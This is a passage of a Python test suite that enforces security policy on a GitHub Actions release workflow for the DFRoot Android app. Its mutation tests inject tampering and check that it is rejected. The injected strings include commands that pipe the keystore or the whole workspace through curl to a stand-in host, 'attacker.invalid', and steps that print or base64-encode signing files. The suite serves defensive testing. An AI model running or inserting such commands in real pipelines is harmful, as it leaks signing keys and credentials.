        ancestry = job_steps.index(ancestry_step)
        signing = next(index for index, step in enumerate(job_steps) if step_property(step, "name") == "Write signing material")
        self.assertLess(ancestry, signing)
        for index, step in enumerate(job_steps):
            if re.search(r"\bsecrets(?:\.|\[)", step):
                self.assertEqual(index, signing)
        signing_step = job_steps[signing]
        self.assertEqual(run_script(signing_step), "java scripts/WriteSigningProperties.java ci .")
        self.assertEqual(
            mapping(signing_step, "env", 8),
            {name: "${{ secrets." + name + " }}" for name in sorted(SIGNING_SECRETS)},
        )

    def test_release_verifies_one_signed_apk_checksums_and_cleans_up(self) -> None:
        job = self.jobs["build-release"]
        self.assertEqual(len(action_steps(job, "actions/setup-java")), 1)
        self.assertEqual(len(action_steps(job, "gradle/actions/setup-gradle")), 1)
        builds = [run_script(step) for step in steps(job) if "./gradlew" in run_script(step)]
        self.assertEqual(len(builds), 1)
        self.assertIn(":app:assembleRelease", builds[0])
        assert_exact_command_lines(self.raw)
        verify = run_script(named_step(job, "Verify signed release APK"))
        self.assertIn("apks=(app/build/outputs/apk/release/DFRoot_*.apk)", verify)
        self.assertIn("${#apks[@]} -ne 1", verify)
        package = run_script(named_step(job, "Package signed release APK"))
        self.assertIn("cp --", package)
        self.assertIn("release/", package)
        uploads = action_steps(job, "actions/upload-artifact")
        self.assertEqual(len(uploads), 2)
        release_upload = [
            step for step in uploads
            if mapping(step, "with", 8).get("name") == RELEASE_ARTIFACT_NAME
        ]
        self.assertEqual(len(release_upload), 1)
        inputs = mapping(release_upload[0], "with", 8)
        self.assertEqual(inputs.get("path"), RELEASE_UPLOAD_PATH)
        self.assertEqual(inputs.get("retention-days"), "1")
        cleanup = steps(job)[-1]
        self.assertEqual(step_property(cleanup, "if"), "${{ always() }}")
        cleanup_script = run_script(cleanup)
        self.assertIn("rm -f", cleanup_script)
        self.assertIn("signing.properties", cleanup_script)
        self.assertIn("keystore.jks", cleanup_script)

    def test_publisher_only_downloads_verifies_and_publishes(self) -> None:
        job = self.jobs["publish"]
        self.assertEqual(property_value(job, "needs", 4), "build-release")
        self.assertEqual(action_steps(job, "actions/checkout"), [])
        uses = [uses for step in steps(job) if (uses := step_property(step, "uses"))]
        self.assertEqual(
            uses,
            [
                "actions/download-artifact@" + ACTION_PINS["actions/download-artifact"][0],
                "softprops/action-gh-release@" + ACTION_PINS["softprops/action-gh-release"][0],
            ],
        )
        download = action_steps(job, "actions/download-artifact")[0]
        self.assertEqual(mapping(download, "with", 8).get("name"), "DFRoot-release")
        self.assertEqual(mapping(download, "with", 8).get("path"), "dist")
        job_steps = steps(job)
        run_steps = [step for step in job_steps if run_script(step)]
        self.assertEqual(len(run_steps), 1)
        self.assertEqual(step_property(run_steps[0], "name"), "Verify release checksum")
        scripts = run_script(run_steps[0])
        self.assertNotRegex(scripts, r"\b(?:bash|sh|make|gradle|java|python|npm|yarn|cargo|go)\b")
        self.assertNotIn("./gradlew", job)
        self.assertNotRegex(job, r":app:assemble(?:Debug|Release)")
        self.assertNotIn("WriteSigningProperties", job)
        release = action_steps(job, "softprops/action-gh-release")[0]
        self.assertLess(job_steps.index(run_steps[0]), job_steps.index(release))
        inputs = mapping(release, "with", 8)
        self.assertEqual(inputs.get("fail_on_unmatched_files"), "true")
        self.assertEqual(inputs.get("overwrite_files"), "true")
        self.assertEqual(inputs.get("files"), PUBLISH_FILES)

    def test_publisher_checksum_script_is_exact(self) -> None:
        """The full publisher script is equality-locked, binding line included."""
        assert_exact_command_lines(self.raw)
        publisher = run_script(named_step(self.jobs["publish"], "Verify release checksum"))
        self.assertEqual(publisher, VERIFY_CHECKSUM_SCRIPT)
        self.assertIn('sha256sum --check "$checksum"', active_script_lines(publisher))
        for line in (
            'mapfile -t checksum_lines < "dist/$checksum"',
            'if [[ $manifest_name != "$apk" ]]; then',
            "manifest_name=${BASH_REMATCH[3]}",
        ):
            with self.subTest(line=line):
                self.assertIn(line, active_script_lines(publisher))

    def test_every_upload_fails_closed_and_names_are_exact(self) -> None:
        uploads = [step for job in self.jobs.values() for step in action_steps(job, "actions/upload-artifact")]
        self.assertEqual(len(uploads), 4)
        self.assertEqual(
            sorted(mapping(upload, "with", 8).get("name") for upload in uploads),
            sorted(name for names in UPLOAD_ARTIFACT_NAMES.values() for name in names),
        )
        for upload in uploads:
            with self.subTest(artifact=mapping(upload, "with", 8).get("name")):
                inputs = mapping(upload, "with", 8)
                self.assertEqual(inputs.get("if-no-files-found"), "error")
                self.assertNotIn("signing", str(inputs).lower())
                if mapping(upload, "with", 8).get("name") != PROVENANCE_ARTIFACT_NAME:
                    self.assertEqual(inputs.get("overwrite"), "true")

    def test_gradle_builds_retry_and_jobs_have_timeouts(self) -> None:
        for name, job in self.jobs.items():
            with self.subTest(job=name):
                timeout = property_value(job, "timeout-minutes", 4)
                self.assertIsNotNone(timeout)
                self.assertGreater(int(timeout or 0), 0)
        for name, build_step in (
            ("build-dfroot", DEBUG_BUILD_STEP),
            ("build-release", "Build signed release APK"),
        ):
            script = run_script(named_step(self.jobs[name], build_step))
            self.assertIn("for attempt in 1 2 3", script)
            self.assertIn("sleep 30", script)
            self.assertIn("exit 1", script)
        self.assertIn(
            "./gradlew :app:testDebugUnitTest",
            run_script(named_step(self.jobs[HOST_GATES_JOB], JVM_TEST_STEP)),
        )


class MutationDetectionTests(unittest.TestCase):
    """Every mutation here must be rejected by the hardened policy checks."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.raw = WORKFLOW.read_text(encoding="utf-8")

    def mutate(self, old: str, new: str) -> str:
        self.assertIn(old, self.raw)
        return self.raw.replace(old, new, 1)

    def test_adding_pull_request_target_trigger_is_rejected(self) -> None:
        mutated = self.mutate(
            "  workflow_dispatch:\n",
            "  pull_request_target:\n"
            "    branches:\n"
            "      - master\n"
            "      - main\n"
            "  workflow_dispatch:\n",
        )
        with self.assertRaisesRegex(AssertionError, "pull_request_target must not be"):
            assert_exact_triggers(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_widening_the_tag_trigger_is_rejected(self) -> None:
        cases = {
            "extra tag pattern": (
                "    tags:\n      - 'v*'\n",
                "    tags:\n      - 'v*'\n      - '*'\n",
            ),
            "replaced tag pattern": (
                "      - 'v*'\n",
                "      - 'v*.*'\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaisesRegex(AssertionError, "triggers must be exactly"):
                    assert_exact_triggers(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_different_valid_ddk_digest_is_rejected(self) -> None:
        # `f` * 64 is a syntactically valid digest, so format-only checks pass;
        # the exact constant is what must reject it.
        mutated = self.mutate("@sha256:" + DDK_IMAGE_DIGEST, "@sha256:" + "f" * 64)
        self.assertIn("@sha256:" + "f" * 64, mutated)
        with self.assertRaisesRegex(AssertionError, "DDK image digest must be exactly"):
            assert_ddk_image_digest(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_quoted_uses_key_is_rejected(self) -> None:
        mutated = self.mutate("        uses: actions/checkout@", '        "uses": actions/checkout@')
        with self.assertRaises(AssertionError):
            assert_strict_yaml(mutated)
        with self.assertRaisesRegex(AssertionError, "quoted YAML key"):
            assert_strict_yaml(mutated)

    def test_flow_mapping_is_rejected(self) -> None:
        mutated = self.mutate(
            "        with:\n          persist-credentials: false\n",
            "        with: {persist-credentials: false}\n",
        )
        with self.assertRaisesRegex(AssertionError, "flow-style"):
            assert_strict_yaml(mutated)

    def test_flow_sequence_is_rejected(self) -> None:
        mutated = self.mutate("    branches:\n      - master\n      - main\n", "    branches: [master, main]\n")
        with self.assertRaisesRegex(AssertionError, "flow-style"):
            assert_strict_yaml(mutated)

    def test_anchors_aliases_and_merge_keys_are_rejected(self) -> None:
        cases = {
            "anchor": ("          persist-credentials: false", "          persist-credentials: &pc false"),
            "alias": ("          java-version: 21", "          java-version: *pc"),
            "merge key": ("          distribution: temurin", "          <<: *defaults"),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                with self.assertRaises(AssertionError):
                    assert_strict_yaml(self.mutate(old, new))

    def test_heredoc_noop_in_run_script_is_rejected(self) -> None:
        mutated = self.mutate(
            "          bash tests/signing/run_tests.sh\n",
            "          bash tests/signing/run_tests.sh\n"
            "          cat <<'NOOP' >/dev/null\n"
            "          echo hidden command\n"
            "          NOOP\n",
        )
        with self.assertRaisesRegex(AssertionError, "heredoc in run script"):
            assert_strict_yaml(mutated)

    def test_comment_spoofing_of_test_command_is_detected(self) -> None:
        mutated = self.mutate(
            "          bash tests/signing/run_tests.sh",
            "          # bash tests/signing/run_tests.sh",
        )
        with self.assertRaises(AssertionError):
            assert_exact_test_ci_commands(mutated)

    def test_quote_spoofing_of_test_command_is_detected(self) -> None:
        mutated = self.mutate(
            "          bash tests/signing/run_tests.sh",
            '          "bash tests/signing/run_tests.sh"',
        )
        with self.assertRaises(AssertionError):
            assert_exact_test_ci_commands(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_secrets_context_bypasses_are_rejected(self) -> None:
        cases = {
            "compact expression": ("KEYSTORE: ${{ secrets.KEYSTORE }}", "KEYSTORE: ${{secrets.KEYSTORE}}"),
            "bare secrets": (
                "          java scripts/WriteSigningProperties.java ci .",
                "          echo secrets >/dev/null\n          java scripts/WriteSigningProperties.java ci .",
            ),
            "toJSON(secrets)": (
                "KEY_ALIAS: ${{ secrets.KEY_ALIAS }}",
                "KEY_ALIAS: ${{ toJSON(secrets) }}",
            ),
            "commented token in run script": (
                "          bash tests/signing/run_tests.sh",
                "          # ${{ secrets.KEYSTORE }}\n          bash tests/signing/run_tests.sh",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                with self.assertRaises(AssertionError):
                    assert_no_secrets_bypass(self.mutate(old, new))

    def test_continue_on_error_mutation_is_detected(self) -> None:
        mutated = self.mutate(
            "      - name: Run workflow policy tests\n",
            "      - name: Run workflow policy tests\n        continue-on-error: true\n",
        )
        with self.assertRaises(AssertionError):
            assert_no_continue_on_error(mutated)
        with self.assertRaises(AssertionError):
            assert_required_steps_unskippable(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_apksigner_noop_mutation_is_detected(self) -> None:
        mutated = self.mutate(
            '          "$apksigner" verify --verbose --print-certs "${apks[0]}"',
            "          true",
        )
        with self.assertRaises(AssertionError):
            assert_exact_command_lines(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_checksum_noop_mutations_are_detected(self) -> None:
        package = self.mutate('          sha256sum -- "$apk" > "$apk.sha256"', "          true")
        publisher = self.mutate('          sha256sum --check "$checksum"', "          true")
        with self.assertRaises(AssertionError):
            assert_exact_command_lines(package)
        with self.assertRaises(AssertionError):
            assert_exact_command_lines(publisher)

    def test_publisher_manifest_binding_mutations_are_detected(self) -> None:
        """Every new R7 validation line is locked, not just the final digest check."""
        cases = {
            "manifest name check weakened": (
                '          if [[ $manifest_name != "$apk" ]]; then\n',
                '          if [[ -z $manifest_name ]]; then\n',
            ),
            "mapfile block removed": (
                '          mapfile -t checksum_lines < "dist/$checksum"\n',
                "",
            ),
            "line count check weakened": (
                "          if [[ ${#checksum_lines[@]} -ne 1 ]]; then\n",
                "          if [[ ${#checksum_lines[@]} -lt 1 ]]; then\n",
            ),
            "digest regex relaxed": (
                "          if [[ ! $line =~ ^([0-9a-f]{64})('  '|' *')(.+)$ ]]; then\n",
                "          if [[ ! $line =~ ^(.+)$ ]]; then\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                self.assertNotEqual(mutated, self.raw)
                with self.assertRaisesRegex(AssertionError, "publisher run script must be exactly"):
                    assert_exact_command_lines(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_injected_diagnostic_dump_step_is_rejected(self) -> None:
        mutated = self.mutate(
            "      - name: Clean up signing material\n",
            "      - name: Diagnostic dump\n"
            "        run: |\n"
            "          echo diagnostic\n"
            "      - name: Clean up signing material\n",
        )
        with self.assertRaisesRegex(AssertionError, "step names must be exactly"):
            assert_exact_step_names(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_signing_file_disclosure_in_release_run_scripts_is_rejected(self) -> None:
        # An injected step AND a modification of an allowlisted step: both must
        # be rejected, and the exemption must apply to cleanup only.
        injected = self.mutate(
            "      - name: Clean up signing material\n",
            "      - name: Diagnostic dump\n"
            "        run: |\n"
            "          cat signing.properties\n"
            "          base64 keystore.jks\n"
            "      - name: Clean up signing material\n",
        )
        modified = self.mutate(
            "      - name: Build signed release APK\n        run: |\n          set -euo pipefail\n",
            "      - name: Build signed release APK\n        run: |\n"
            "          cat signing.properties >/dev/null\n"
            "          base64 keystore.jks >/dev/null\n"
            "          set -euo pipefail\n",
        )
        for label, text in (("injected step", injected), ("modified step", modified)):
            with self.subTest(mutation=label):
                with self.assertRaisesRegex(AssertionError, "must not reference"):
                    assert_release_scripts_do_not_reference_signing_files(text)
                with self.assertRaises(AssertionError):
                    validate_workflow(text)

    def test_appending_signing_files_to_upload_path_is_rejected(self) -> None:
        mutated = self.mutate(
            "            release/DFRoot_*.apk.sha256\n",
            "            release/DFRoot_*.apk.sha256\n"
            "            signing.properties\n"
            "            keystore.jks\n",
        )
        with self.assertRaisesRegex(AssertionError, "must not contain"):
            assert_exact_artifact_inputs(mutated)
        extra = self.mutate(
            "            release/DFRoot_*.apk.sha256\n",
            "            release/DFRoot_*.apk.sha256\n            release/extra.txt\n",
        )
        with self.assertRaisesRegex(AssertionError, "upload path must be exactly"):
            assert_exact_artifact_inputs(extra)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)
        with self.assertRaises(AssertionError):
            assert_safe_artifact_entries("path", RELEASE_UPLOAD_PATH + "\nsigning.properties")

    def test_appending_signing_files_to_publish_files_is_rejected(self) -> None:
        mutated = self.mutate(
            "            dist/DFRoot_*.apk.sha256\n",
            "            dist/DFRoot_*.apk.sha256\n"
            "            signing.properties\n"
            "            keystore.jks\n",
        )
        with self.assertRaisesRegex(AssertionError, "must not contain"):
            assert_exact_artifact_inputs(mutated)
        extra = self.mutate(
            "            dist/DFRoot_*.apk.sha256\n",
            "            dist/DFRoot_*.apk.sha256\n            dist/extra.txt\n",
        )
        with self.assertRaisesRegex(AssertionError, "publish files must be exactly"):
            assert_exact_artifact_inputs(extra)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)
        with self.assertRaises(AssertionError):
            assert_safe_artifact_entries("files", PUBLISH_FILES + "\n../keystore.jks")

    def test_removing_a_license_asset_is_rejected(self) -> None:
        """Dropping any licence asset from any of the three allowlists is a violation."""
        removals = {
            "release/LICENSE": "            release/LICENSE\n",
            "dist/LICENSE": "            dist/LICENSE\n",
            "CI LICENSE": "            LICENSE\n",
            "release/GPL-3.0.txt": "            release/GPL-3.0.txt\n",
            "dist/NOTICE": "            dist/NOTICE\n",
            "CI NOTICE": "            NOTICE\n",
        }
        for label, old in removals.items():
            with self.subTest(removal=label):
                mutated = self.mutate(old, "")
                with self.assertRaisesRegex(AssertionError, "must be exactly"):
                    assert_exact_artifact_inputs(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)
        package_mutation = self.mutate(
            "          cp -- GPL-3.0.txt LICENSE NOTICE THIRD_PARTY_NOTICES.md release/\n", ""
        )
        with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
            assert_exact_release_run_scripts(package_mutation)
        with self.assertRaises(AssertionError):
            validate_workflow(package_mutation)

    def test_ancestry_step_cannot_be_skipped_or_tolerated(self) -> None:
        anchor = "      - name: Verify tag is on master\n"
        cases = {
            "if: false": anchor + "        if: false\n",
            "continue-on-error true expression": anchor + "        continue-on-error: ${{ true }}\n",
        }
        for label, replacement in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(anchor, replacement)
                with self.assertRaisesRegex(AssertionError, "must not be skippable or tolerated"):
                    assert_required_steps_unskippable(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)
        tolerated = self.mutate(anchor, anchor + "        continue-on-error: ${{ true }}\n")
        with self.assertRaisesRegex(AssertionError, "continue-on-error is not allowed"):
            assert_no_continue_on_error(tolerated)

    def test_ancestry_echo_noop_mutation_is_rejected(self) -> None:
        """`echo 'git merge-base ...'` must not satisfy the ancestry guard.

        The guarded variant still contains the exact ancestry command as text,
        so a substring check would pass it; the equality lock must reject it.
        """
        guarded_line = "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
        whole_guard = (
            "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
            '            echo "Release tag HEAD must be an ancestor of origin/master" >&2\n'
            "            exit 1\n"
            "          fi\n"
        )
        cases = {
            "guarded echo": (
                guarded_line,
                "          if ! echo 'git merge-base --is-ancestor HEAD origin/master'; then\n",
            ),
            "bare echo replacing guard": (
                whole_guard,
                "          echo 'git merge-base --is-ancestor HEAD origin/master'\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)
        guarded_echo = self.mutate(
            guarded_line,
            "          if ! echo 'git merge-base --is-ancestor HEAD origin/master'; then\n",
        )
        ancestry = named_step(
            job_blocks(strip_yaml_comments(guarded_echo))["build-release"], ANCESTRY_STEP
        )
        self.assertIn("git merge-base --is-ancestor HEAD origin/master", run_script(ancestry))

    def test_ancestry_or_true_weakening_is_rejected(self) -> None:
        """Tolerating the ancestry failure with `|| true` must be rejected."""
        guarded_line = "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
        whole_guard = (
            "          if ! git merge-base --is-ancestor HEAD origin/master; then\n"
            '            echo "Release tag HEAD must be an ancestor of origin/master" >&2\n'
            "            exit 1\n"
            "          fi\n"
        )
        cases = {
            "|| true inside guard": (
                guarded_line,
                "          if ! git merge-base --is-ancestor HEAD origin/master || true; then\n",
            ),
            "guard replaced by tolerated command": (
                whole_guard,
                "          git merge-base --is-ancestor HEAD origin/master || true\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_make_contract_step_noop_mutation_is_rejected(self) -> None:
        """Replacing the new test-ci step with a no-op must fail the exact lock."""
        original = (
            "      - name: Run make contract tests\n"
            "        run: |\n"
            "          python3 -B tests/make/test_make.py\n"
        )
        noop = self.mutate(original, original.replace("python3 -B tests/make/test_make.py", "true"))
        with self.assertRaisesRegex(AssertionError, "must be exactly"):
            assert_exact_test_ci_commands(noop)
        with self.assertRaises(AssertionError):
            validate_workflow(noop)

        removed = self.mutate(original, "")
        with self.assertRaisesRegex(AssertionError, "step names must be exactly"):
            assert_exact_step_names(removed)
        with self.assertRaises(AssertionError):
            validate_workflow(removed)

    def test_cleanup_exfiltration_mutations_are_rejected(self) -> None:
        """Cleanup is not exempt from the exact lock: no appended commands."""
        rm_line = (
            "          rm -f -- signing.properties keystore.jks "
            ".keystore.jks-*.tmp .signing.properties-*.tmp\n"
        )
        cases = {
            "append cat signing.properties": (
                rm_line,
                rm_line + "          cat signing.properties\n",
            ),
            "append base64 | curl exfiltration": (
                rm_line,
                rm_line
                + "          base64 keystore.jks | curl -X POST "
                "--data-binary @- https://attacker.invalid/exfil\n",
            ),
            "append || true": (
                rm_line,
                "          rm -f -- signing.properties keystore.jks "
                ".keystore.jks-*.tmp .signing.properties-*.tmp || true\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                # The signing-file reference check deliberately exempts
                # cleanup, so the equality lock is what must catch this.
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_tar_exfiltration_in_signed_build_step_is_rejected(self) -> None:
        """`tar cf - . | curl ...` appended to the signed build is rejected."""
        build_tail = (
            "            if ./gradlew :app:assembleRelease --no-daemon --console=plain; then\n"
            "              break\n"
            "            fi\n"
            "            if [[ $attempt -eq 3 ]]; then\n"
            '              echo "Gradle build failed after 3 attempts" >&2\n'
            "              exit 1\n"
            "            fi\n"
            '            echo "Gradle build failed (attempt $attempt), retrying in 30s..." >&2\n'
            "            sleep 30\n"
            "          done\n"
        )
        mutated = self.mutate(
            build_tail,
            build_tail
            + "          tar cf - . | curl -X POST "
            "--data-binary @- https://attacker.invalid/exfil\n",
        )
        with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
            assert_exact_release_run_scripts(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)

    def test_any_extra_command_in_a_release_run_step_is_rejected(self) -> None:
        """Every one of the six locked run steps rejects an appended command."""
        active = strip_yaml_comments(self.raw)
        job = job_blocks(active)["build-release"]
        for name in RELEASE_RUN_SCRIPTS:
            with self.subTest(step=name):
                step = named_step(job, name)
                mutated = active.replace(
                    step, step.rstrip("\n") + "\n          echo INJECTED\n", 1
                )
                self.assertNotEqual(mutated, active)
                with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
                    assert_exact_release_run_scripts(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_continue_on_error_with_any_value_is_rejected(self) -> None:
        for value in ("false", "${{ true }}", "", "'no'"):
            with self.subTest(value=value):
                mutated = self.mutate(
                    "      - name: Run workflow policy tests\n",
                    "      - name: Run workflow policy tests\n"
                    f"        continue-on-error: {value}\n",
                )
                with self.assertRaisesRegex(AssertionError, "continue-on-error is not allowed"):
                    assert_no_continue_on_error(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_junit_count_weakening_is_rejected(self) -> None:
        for old, new in (
            ("if tests != 39 or", "if tests != 35 or"),
            ("failures != 0 or errors != 0 or skipped != 0:", "failures != 0:"),
            ("if not files:", "if False:"),
        ):
            with self.subTest(mutation=old):
                mutated = self.mutate(old, new)
                with self.assertRaises(AssertionError):
                    assert_pr3_gates(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_host_suite_marker_gate_weakening_is_rejected(self) -> None:
        cases = {
            "one suite removed": (
                "for marker in marker-native marker-ko-policy marker-packaged-ko \\\n",
                "for marker in marker-native marker-ko-policy \\\n",
            ),
            "existence test weakened": ('if [ ! -s "$RUNNER_TEMP/$marker" ]; then', 'if [ -e "$RUNNER_TEMP/$marker" ]; then'),
            "marker echo removed": ('echo "junit-ok" > "$RUNNER_TEMP/marker-junit"\n', ""),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaises(AssertionError):
                    assert_pr3_gates(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_packaged_verifier_removal_is_rejected(self) -> None:
        cases = {
            "verifier invocation removed": (
                "      -P app/src/main/jni/verify_packaged_ko.cmake\n", ""
            ),
            "stale manifest not invalidated": (
                '          rm -f "$PMAN" "${PMAN}.dfroot_ko.dump"\n', ""
            ),
            "per-APK loop removed": ('          for apk in "${STAGED[@]}"; do\n', "          :\n"),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaises(AssertionError):
                    assert_pr3_gates(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_upload_choke_point_weakening_is_rejected(self) -> None:
        anchor = "      - name: Assert distributable evidence before upload\n"
        cases = {
            "skippable": anchor + "        if: false\n",
            "tolerated": anchor + "        continue-on-error: true\n",
            "removed": "",
        }
        for label, replacement in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(anchor, replacement)
                with self.assertRaises(AssertionError):
                    assert_required_steps_unskippable(mutated) if label != "removed" else assert_exact_step_names(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)
        noop = self.mutate('          if [ "$missing" -ne 0 ]; then exit 1; fi\n          echo "distributable-evidence-ok"', '          echo "distributable-evidence-ok"')
        with self.assertRaisesRegex(AssertionError, "run script must be exactly"):
            assert_exact_release_run_scripts(noop)
        with self.assertRaises(AssertionError):
            validate_workflow(noop)

    def test_pr_ci_cannot_be_turned_into_a_release_claim(self) -> None:
        cases = {
            "release artifact name": (
                "          name: DFRoot-CI-evidence\n",
                "          name: DFRoot-release\n",
            ),
            "release claim in summary": (
                '          echo "## CI evidence artifact scope"\n',
                '          echo "## CI evidence artifact scope: signed release"\n',
            ),
            "assembleRelease in PR CI": (
                "          if ./gradlew :app:assembleDebug --no-daemon --console=plain; then\n",
                "          if ./gradlew :app:assembleDebug :app:assembleRelease --no-daemon --console=plain; then\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaises(AssertionError):
                    assert_pr3_gates(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_reverting_the_host_gates_graph_is_rejected(self) -> None:
        """Neither build path may bypass the unconditional host evidence job."""
        cases = {
            "build-release back to build-lkms": (
                "  build-release:\n    name: Signed release APK\n    needs: host-gates\n",
                "  build-release:\n    name: Signed release APK\n    needs: build-lkms\n",
            ),
            "build-dfroot back to build-lkms": (
                "  build-dfroot:\n    name: CI DFRoot evidence gates\n    needs: host-gates\n",
                "  build-dfroot:\n    name: CI DFRoot evidence gates\n    needs: build-lkms\n",
            ),
            "host-gates made conditional": (
                "  host-gates:\n    name: Host evidence gates\n    needs: build-lkms\n",
                "  host-gates:\n    name: Host evidence gates\n    needs: build-lkms\n"
                "    if: ${{ !(" + TAG_PUSH + ") }}\n",
            ),
        }
        for label, (old, new) in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(old, new)
                with self.assertRaises(AssertionError):
                    assert_job_graph(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_readding_an_apk_to_the_ci_upload_is_rejected(self) -> None:
        """P2-04: PR/branch/manual uploads stay APK-free."""
        anchor = "          path: |\n            GPL-3.0.txt\n"
        cases = {
            "debug APK": "            app/build/outputs/apk/debug/DFRoot_*.apk\n",
            "release APK": "            app/build/outputs/apk/release/DFRoot_*.apk\n",
            "generic APK glob": "            build/*.apk\n",
        }
        for label, apk_path in cases.items():
            with self.subTest(mutation=label):
                mutated = self.mutate(anchor, "          path: |\n" + apk_path + "            GPL-3.0.txt\n")
                with self.assertRaisesRegex(AssertionError, "CI evidence upload must not include any APK path"):
                    assert_ci_evidence_upload_has_no_apk(mutated)
                with self.assertRaisesRegex(AssertionError, "upload path must be exactly"):
                    assert_exact_artifact_inputs(mutated)
                with self.assertRaises(AssertionError):
                    validate_workflow(mutated)

    def test_checkout_sha_assertion_cannot_be_weakened_or_skipped(self) -> None:
        mutated = self.mutate(
            "          head=$(git rev-parse 'HEAD^{commit}')\n",
            "          head=$GITHUB_SHA\n",
        )
        with self.assertRaisesRegex(AssertionError, "host-gates/Assert checked-out SHA run script"):
            assert_exact_host_gates_run_scripts(mutated)
        with self.assertRaises(AssertionError):
            validate_workflow(mutated)
        skipped = self.mutate(
            "      - name: Assert checked-out SHA\n",
            "      - name: Assert checked-out SHA\n        if: false\n",
        )
        with self.assertRaisesRegex(AssertionError, "must not be skippable or tolerated"):
            assert_required_steps_unskippable(skipped)
        with self.assertRaises(AssertionError):
            validate_workflow(skipped)

    def test_host_suite_moved_back_into_build_dfroot_is_rejected(self) -> None:
        moved = self.raw.replace(
            "      - name: Build debug APK (compile/content gate only)\n",
            "      - name: Host status-protocol tests\n"
            "        run: |\n"
            "          set -euo pipefail\n"
            "          make -C tests/native test\n"
            "          echo \"native-ok\" > \"$RUNNER_TEMP/marker-native\"\n"
            "      - name: Build debug APK (compile/content gate only)\n",
            1,
        )
        self.assertNotEqual(moved, self.raw)
        with self.assertRaisesRegex(AssertionError, "must not repeat host-gates step"):
            assert_pr3_gates(moved)
        with self.assertRaises(AssertionError):
            validate_workflow(moved)

    def test_smoke_identity_reverts_are_rejected(self) -> None:
        gradle = (ROOT / "app" / "build.gradle.kts").read_text(encoding="utf-8")
        smoke = (ROOT / "tests" / "signing" / "smoke_signed_release.sh").read_text(encoding="utf-8")
        reverted_gradle = gradle.replace(
            'applicationId = if (signingSmokeSkipNative) "df.root.signingsmoke" else "df.root"',
            'applicationId = "df.root"',
        )
        reverted_smoke = smoke.replace(
            "SIGNED_APK=app/build/outputs/apk/release/SigningSmoke-4.8-gzif-signingsmoke.apk",
            "SIGNED_APK=app/build/outputs/apk/release/DFRoot_4.8-gzif.apk",
        )
        dropped_rejection = smoke.replace(
            "if compgen -G 'app/build/outputs/apk/*/DFRoot_*.apk' >/dev/null; then\n"
            "    printf 'ERROR: signing smoke produced a production-named DFRoot_*.apk.\\n' >&2\n"
            "    exit 1\nfi\n",
            "",
        )
        self.assertNotEqual(reverted_gradle, gradle)
        self.assertNotEqual(reverted_smoke, smoke)
        self.assertNotEqual(dropped_rejection, smoke)
        for label, g, s in (
            ("production applicationId", reverted_gradle, smoke),
            ("production APK name", gradle, reverted_smoke),
            ("no DFRoot rejection", gradle, dropped_rejection),
        ):
            with self.subTest(mutation=label):
                with self.assertRaises(AssertionError):
                    assert_smoke_identity(g, s)

    def test_loader_keep_debug_symbols_reverts_are_rejected(self) -> None:
        gradle = (ROOT / "app" / "build.gradle.kts").read_text(encoding="utf-8")
        for fragment in LOADER_KEEP_DEBUG_SYMBOLS_FRAGMENTS:
